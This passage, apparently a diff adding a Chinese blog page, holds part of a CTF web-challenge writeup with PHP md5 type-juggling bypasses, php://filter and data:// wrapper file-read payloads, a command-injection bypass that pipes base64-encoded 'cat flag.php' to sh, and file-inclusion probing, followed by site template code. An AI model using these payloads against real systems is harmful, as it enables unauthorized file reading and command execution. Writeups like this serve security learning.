php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一层套一层，第一层POST传参a，要求不能匹配到数字且有a的整数值，数组可以绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>b1和b2同样的方法，md5绕过，因为数组都为空，所以md5值相等</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b1[]=<span class="number">2</span>&amp;&amp;b2[]=<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>然后再看c1和c2，要求是字符串，且md5值<font color="red">类型</font>相等，所以只要有两个开头都为0e的md5字符串就可以</p>
+<p>最终payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=<span class="number">1</span>&amp;&amp;b1[]=<span class="number">2</span>&amp;&amp;b2[]=<span class="number">3</span>&amp;&amp;c1=s878926199a&amp;&amp;c2=s155964671a</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a>导弹迷踪</h1><p>经典的web游戏题，但是不用真的去玩游戏，根据经验找到game.js</p>
+<p><img src="/D:/网安\网安\blog\themes\next\source\images\SPU2025\game.png"></p>
+<p>直接拿到flag</p>
+<h1 id="PseudoProtocols"><a href="#PseudoProtocols" class="headerlink" title="PseudoProtocols"></a>PseudoProtocols</h1><p><img src="/D:/网安\网安\blog\themes\next\source\images\SPU2025\po_1.png"></p>
+<p>直接给了参数wllm，想到filter伪协议直接读hint.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=hint.php</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>得到base64加密后的代码,解密一下得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>, <span class="string">&quot;180&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;I want flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到file_get_contents想到data伪协议</p>
+<p>直接套</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=data:<span class="comment">//text/plain,I want flag</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="pingpingping"><a href="#pingpingping" class="headerlink" title="pingpingping"></a>pingpingping</h1><p><img src="/D:/网安\网安\blog\themes\next\source\images\SPU2025\ping_1.png"></p>
+<p>先用tac%0aflag.php 查看flag文件</p>
+<p>发现flag字符被ban掉</p>
+<p>看到网上有差不多的题目</p>
+<p>直接套payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>$IFS$<span class="number">1</span>Y2F0IGZsYWcucGhw|base64$IFS$<span class="number">1</span>-d|sh</span><br></pre></td></tr></table></figure>
+
+<p>$IFS$1代替空格</p>
+<p>base64 -d解码</p>
+<p>sh当作命令执行</p>
+<p>base64内容为 cat flag.php</p>
+<p>最后flag在源代码里</p>
+<h1 id="高亮主题-划掉-背景查看器"><a href="#高亮主题-划掉-背景查看器" class="headerlink" title="高亮主题(划掉)背景查看器"></a>高亮主题(划掉)背景查看器</h1><p>打开bp，抓包</p>
+<p><img src="/D:/网安\网安\blog\themes\next\source\images\SPU2025\theme_1.png"></p>
+<p>有个传参theme&#x3D;theme1.php</p>
+<p>尝试改成flag</p>
+<p>报错</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(themes/flag): failed to open stream: No such file <span class="keyword">or</span> directory in &lt;b&gt;/<span class="keyword">var</span>/www/html/index.php</span><br></pre></td></tr></table></figure>
+
+<p>题目提示了文件包含漏洞，就挨个路径试</p>
+<p><img src="/D:/网安\网安\blog\themes\next\source\images\SPU2025\theme_2.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" <i class="fa fa-tag"></i> web</a>
+              <a href="/tags/writeup/" <i class="fa fa-tag"></i> writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2998c71a.html" rel="prev" title="NepCTF2025">
+      <i class="fa fa-chevron-left"></i> NepCTF2025
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/f937296e.html" rel="next" title="moectf2025 writeup">
+      moectf2025 writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+    </div>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#gift-F12"><span class="nav-number">1.</span> <span class="nav-text">gift_F12</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Do-you-know-http"><span class="nav-number">2.</span> <span class="nav-text">Do_you_know_http</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jicao"><span class="nav-number">3.</span> <span class="nav-text">jicao</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WebFTP"><span class="nav-number">4.</span> <span class="nav-text">WebFTP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#finalrce"><span class="nav-number">5.</span> <span class="nav-text">finalrce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-SSTI"><span class="nav-number">6.</span> <span class="nav-text">ez_SSTI</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A5%87%E5%A6%99%E7%9A%84MD5"><span class="nav-number">7.</span> <span class="nav-text">奇妙的MD5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9C%8B%E7%9C%8BIP"><span class="nav-number">8.</span> <span class="nav-text">看看IP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#babyRCE"><span class="nav-number">9.</span> <span class="nav-text">babyRCE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-ez-php"><span class="nav-number">10.</span> <span class="nav-text">ez_ez_php</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#caidao"><span class="nav-number">11.</span> <span class="nav-text">caidao</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#babyphp"><span class="nav-number">12.</span> <span class="nav-text">babyphp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%BC%E5%BC%B9%E8%BF%B7%E8%B8%AA"><span class="nav-number">13.</span> <span class="nav-text">导弹迷踪</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PseudoProtocols"><span class="nav-number">14.</span> <span class="nav-text">PseudoProtocols</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pingpingping"><span class="nav-number">15.</span> <span class="nav-text">pingpingping</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%AB%98%E4%BA%AE%E4%B8%BB%E9%A2%98-%E5%88%92%E6%8E%89-%E8%83%8C%E6%99%AF%E6%9F%A5%E7%9C%8B%E5%99%A8"><span class="nav-number">16.</span> <span class="nav-text">高亮主题(划掉)背景查看器</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="M21in"
+      src="/images/blog_head.jpg#/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">M21in</p>
+  <div class="site-description" itemprop="description">用来记录生活和技术的地方</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=483937795&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M21in</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+<!-- 代码块复制功能 -->
+<script type="text/javascript" src="/js/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/clipboard-use.js"></script>
